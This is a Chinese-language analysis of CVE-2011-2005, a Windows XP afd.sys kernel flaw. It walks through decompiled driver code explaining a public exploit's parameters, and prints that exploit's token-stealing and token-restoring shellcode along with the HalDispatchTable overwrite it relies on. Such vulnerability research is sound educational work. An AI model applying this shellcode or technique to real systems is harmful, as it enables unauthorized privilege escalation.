{"tags": "Exploit kernel", "title": "CVE-2011-2005\u5206\u6790", "content": "## 0x00.\u73af\u5883\r\n\r\n\u7cfb\u7edf:\uff1aWINXP SP3 \r\n\r\nEXP: [exploit-db](https://www.exploit-db.com/exploits/18176/)\r\n\r\n## 0x01.\u6210\u56e0\r\nafd.sys\u4e2d\u5bf9\u7528\u6237IO\u53c2\u6570\u68c0\u67e5\u7f3a\u9677\u5bfc\u81f4\u4efb\u610f\u5730\u5740\u5199\u5b9a\u503c\uff0c\u88ab\u5229\u7528\u6765\u4fee\u6539\u7cfb\u7edf\u8c03\u7528\u8868\u51fd\u6570\u5730\u5740\uff0c\u5b8c\u6210\u6267\u884c\u4efb\u610fshellcode\u5b8c\u6210token\u66ff\u6362\uff0c\u4ece\u800c\u63d0\u5347\u6743\u9650\r\n\r\n## 0x02.EXP\u5206\u6790\u8981\u70b9\r\n\r\n1.inputBuffer\u4e3a\u4ec0\u4e48\u8981\u8fd9\u4e48\u6784\u9020\uff1f\r\n\r\n\u89c1IDA F5\u5206\u6790\r\n```c\r\nint __fastcall AfdJoinLeaf(_IRP *a1, int a2)\r\n{\r\n  v2 = a2;\r\n  inputLength = *(a2 + 8);\r\n  if ( inputLength < 0x18 || (a2 = *(a2 + 4)) != 0 && a2 < 8 )// inputLength >= 0x18\r\n                                                // outputLength >= 8\r\n                                                // outputLength == 0\r\n  {\r\n    v37 = 0xC000000D;\r\n    v10 = a1;\r\n    goto LABEL_72;\r\n  }\r\n  if ( a1->RequestorMode && inputLength )\r\n  {\r\n    if ( *(v2 + 16) & 3 )\r\n      ExRaiseDatatypeMisalignment();\r\n    type3InputBuffer = *(v2 + 16);\r\n    v5 = type3InputBuffer + *(v2 + 8);\r\n    if ( v5 < type3InputBuffer || v5 > _MmUserProbeAddress )\r\n      ExRaiseAccessViolation();\r\n  }\r\n  inputBuffer = *(v2 + 16);\r\n  v7 = (inputBuffer + 12);\r\n  v33 = *(v2 + 8) - 12;                         // 0x108-12\r\n  *v8 = ExAllocatePoolWithQuotaTag(16, v33 + 48, 0xC9646641);\r\n  buf = *v8;\r\n  memset(*v8, 0, 0x30u);\r\n  qmemcpy((*v8 + 48), v7, v33);\r\n  if ( *(*v8 + 48) != 1 || v33 < *(buf + 26) + 8 )// *(input+c) == 1\r\n                                                // *(input+10) <= f4\r\n    ExRaiseStatus(-1073741811);\r\n  if ( *(v2 + 4) && a1->RequestorMode == UserMode )// outputBufferLength == 0\u624d\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u67e5\r\n  {\r\n    if ( a1->UserBuffer >= _MmUserProbeAddress )\r\n      *_MmUserProbeAddress = 0;\r\n  }\r\n```\r\n\u56e0\u6b64\u53ea\u8981\u6ee1\u8db3*(input+c) == 1\u548c*(input+10) <= f4\u5373\u53ef<br/><br/>\r\n\r\n2.\u4e3a\u4ec0\u4e48inutBuffer\u7533\u8bf7\u7684\u5730\u5740\u662f0x1001?\r\n\r\n\u5b9e\u9645\u4f1a\u5bf9\u9f50\u4ece0x1000\u5206\u914d<br/><br/>\r\n\r\n3.\u4e3a\u4ec0\u4e48VirtualProtect\u5730\u5740\u662f0x20000\uff1f\r\n\r\npython.exe\u4f1a\u4f7f\u75280x20000~0x21000\u7684\u5185\u5b58\uff0c\u521a\u597d\u5229\u7528\u4e0d\u7528\u81ea\u5df1\u7533\u8bf7\u4e86\u3002<br/><br/>\r\n\r\n4.\u4e3a\u4ec0\u4e48\u8981\u6253\u5f00\u4e00\u4e2a\u6ca1\u4eba\u5360\u7528\u7684\u7aef\u53e3\uff1f\u5e76\u5728ZwDeviceIoControlFile\u5f53\u505a\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1f\r\n\u8fd8\u662f\u5728AfdJoinLeaf\u51fd\u6570\u4e2d\r\n```c\r\n  v14 = *socket;\r\n  if ( *socket != 0xAFD0u && v14 != 0xAFD2u && v14 != 0xAFD1u )\r\n  {\r\nLABEL_62:\r\n    v37 = 0xC000000D;\r\n    goto LABEL_68;\r\n  }\r\n  if ( !v30 )\r\n  {\r\n    if ( v14 == 0xAFD1u )\r\n    {\r\n      if ( *(socket + 2) != 3 )\r\n        return AfdDoDatagramConnect(fileObj, v10, 1);\r\n      v37 = 0;\r\n      goto LABEL_68;\r\n    }\r\n    if ( v14 != 0xAFD0u && v14 != 0xAFD2u && v14 != 0xAFD4u && v14 != 0xAFD6u )\r\n      goto LABEL_62;\r\n    v29 = socket + 188;\r\n    if ( _InterlockedCompareExchange(socket + 47, 3, 0) )\r\n      goto LABEL_62;\r\n    if ( *(socket + 2) == 2 )\r\n    {\r\n      v37 = AfdCreateConnection(\r\n              (*(socket + 35) + 16),\r\n              *(socket + 34),\r\n              (*(socket + 1) >> 9) & 1,\r\n              (*(socket + 3) >> 8) & 1,\r\n              *(socket + 6),\r\n              &v36);\r\n      if ( v37 >= 0 )\r\n        goto LABEL_50;\r\n```\r\n\u53ef\u4ee5\u770b\u5230\u8981\u5230\u8fbeLABEL_50\uff0csocket\u72b6\u6001\u8981\u662f0xAFD0\u30010xAFD2\u30010xAFD4\u30010xAFD6\u4e2d\u4e00\u4e2a\uff0c\u800c\u5982\u679c\u6253\u5f00\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u7aef\u53e3\uff0c\u6b64\u5904\u7684\u503c\u662f0xAFD2\u3002<br/><br/>\r\n\r\n5.NtQueryIntervalProfile\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u4ec0\u4e48\u662f0x1337?\r\n\u5728nt\u4e2d\u4ee3\u7801\u5982\u4e0b\r\n```c\r\nint __stdcall KeQueryIntervalProfile(int a1)\r\n{\r\n  int result; // eax@2\r\n  int v2; // [sp+0h] [bp-Ch]@5\r\n  char v3; // [sp+4h] [bp-8h]@6\r\n  int v4; // [sp+8h] [bp-4h]@7\r\n\r\n  if ( a1 )\r\n  {\r\n    if ( a1 == 1 )\r\n    {\r\n      result = KiProfileAlignmentFixupInterval;\r\n    }\r\n    else\r\n    {\r\n      v2 = a1;\r\n      if ( off_47C03C(1, 12, &v2, &a1) >= 0 && v3 )  \u6b64\u5904\u8c03\u7528HaliQuerySystemInformation\u89e6\u53d1\u6f0f\u6d1e\r\n        result = v4;\r\n      else\r\n        result = 0;\r\n    }\r\n  }\r\n  else\r\n  {\r\n    result = KiProfileInterval;\r\n  }\r\n  return result;\r\n}\r\n```\r\n\u5176\u5b9e\u53ea\u8981\u7b2c\u4e00\u4e2a\u53c2\u6570\u975e\u96f6\u4e14\u4e0d\u7b49\u4e8e1\u5373\u53ef\uff0c\u6211\u6d4b\u8bd5\u6539\u62100x2\u662f\u53ef\u4ee5\u7684<br/><br/>\r\n6.\u4fee\u6539token\u7684shellcode\u4ec0\u4e48\u4f5c\u7528\uff1f\r\n```x86asm\r\n000207ba 31c0            xor     eax,eax\r\n000207bc b836e46f80      mov     eax,offset hal!HaliAcpiMachineStateInit+0xd8 (806fe436)\r\n000207c1 a340e05480      mov     dword ptr [nt!HalDispatchTable+0x8 (8054e040)],eax\r\n000207c6 b8babb6f80      mov     eax,offset hal!HalpUnmaskAcpiInterrupt+0x70 (806fbbba)\r\n000207cb a33ce05480      mov     dword ptr [nt!HalDispatchTable+0x4 (8054e03c)],eax\r\n000207d0 52              push    edx\r\n000207d1 53              push    ebx\r\n000207d2 33c0            xor     eax,eax\r\n000207d4 648b8024010000  mov     eax,dword ptr fs:[eax+124h] ;kthread\r\n000207db 8b4044          mov     eax,dword ptr [eax+44h]\t;kprocess\r\n000207de 8bc8            mov     ecx,eax\r\n000207e0 8b98c8000000    mov     ebx,dword ptr [eax+0C8h]\t;eprocess token\r\n000207e6 891d00090200    mov     dword ptr ds:[20900h],ebx\t;token save to 20900\r\n000207ec 8b8088000000    mov     eax,dword ptr [eax+88h]\t;ActiveProcessLinks\r\n000207f2 81e888000000    sub     eax,88h\t\t\t\t\t;eprocess\r\n000207f8 81b88400000004000000 cmp dword ptr [eax+84h],4\t\t;pid,find system.exe\r\n00020802 75e8            jne     000207ec\r\n00020804 8b90c8000000    mov     edx,dword ptr [eax+0C8h]\t;system token\r\n0002080a 8bc1            mov     eax,ecx\t\t\t\t\t; eax = current kprocess\r\n0002080c 8990c8000000    mov     dword ptr [eax+0C8h],edx\t; privilege escalation\r\n00020812 5b              pop     ebx\r\n00020813 5a              pop     edx\r\n00020814 c210            ret     10h\r\n```\r\n<br/>\r\n7.\u8fd8\u539ftoken\u7684shellcode\u4ec0\u4e48\u4f5c\u7528\uff1f\r\n```x86asm\r\n000207ba 31c0            xor     eax,eax\r\n000207bc b836e46f80      mov     eax,offset hal!HaliAcpiMachineStateInit+0xd8 (806fe436)\r\n000207c1 a340e05480      mov     dword ptr [nt!HalDispatchTable+0x8 (8054e040)],eax\r\n000207c6 b8babb6f80      mov     eax,offset hal!HalpUnmaskAcpiInterrupt+0x70 (806fbbba)\r\n000207cb a33ce05480      mov     dword ptr [nt!HalDispatchTable+0x4 (8054e03c)],eax\r\n000207d0 52              push    edx\r\n000207d1 33c0            xor     eax,eax\r\n000207d3 648b8024010000  mov     eax,dword ptr fs:[eax+124h]\r\n000207da 8b4044          mov     eax,dword ptr [eax+44h]\r\n000207dd 8b1500090200    mov     edx,dword ptr ds:[20900h] ;\u53d6\u4fdd\u5b58\u539ftoken\u6307\u9488\r\n000207e3 8990c8000000    mov     dword ptr [eax+0C8h],edx\t;\u8fd8\u539ftoken\r\n000207e9 5a              pop     edx\r\n000207ea c21000          ret     10h\r\n```\r\n<br/>\r\n8.\u4e3a\u4ec0\u4e48shellcode\u4ee3\u7801\u5199\u57280x000207xx\u5730\u5740\uff1f\r\n\u6211\u4eec\u770b\u5230\u4e0a\u9762\u4f1a\u8c03\u7528AfdCreateConnection,\u5355\u6b65\u8ddf\u8e2a\u627e\u5230\u6e90\u5934\r\n```x86asm\r\ntcpip!TdiConnect+0x426:\r\nb1e4b7c4 b8070200c0      mov     eax,0C0000207h\r\nb1e4b7c9 e96802ffff      jmp     tcpip!TdiConnect+0x42b (b1e3ba36)\r\n```\r\n\u53ef\u4ee5\u770b\u5230\u4f20\u5165\u6253\u5f00\u672a\u5360\u7528\u7aef\u53e3\u7684handle\uff0c\u4f1a\u8fdb\u5165\u4e0a\u9762\u4ee3\u7801\uff0c\u4ece\u800c\u5199\u5165\u5b9a\u503c0xc0000207,\u4f46\u7531\u4e8e\u8fd9\u4e2a\u9ad8\u5730\u5740\u5c5e\u4e8e\u5185\u6838\uff0c\u6ca1\u529e\u6cd5\u5206\u914d\uff0c\u6240\u4ee5\u5411\u9ad81\u5b57\u8282\u5199\u5165\uff0c\u76f8\u5f53\u4e8e\u66ff\u6362\u9ad83\u4f4d\u5b57\u8282\u4e3a0x207,\u4ece\u800c\u5b9e\u73b0\u66ff\u6362\u7cfb\u7edf\u8c03\u7528\u51fd\u6570\u6307\u9488\uff0c\u5b9e\u73b0\u5229\u7528"}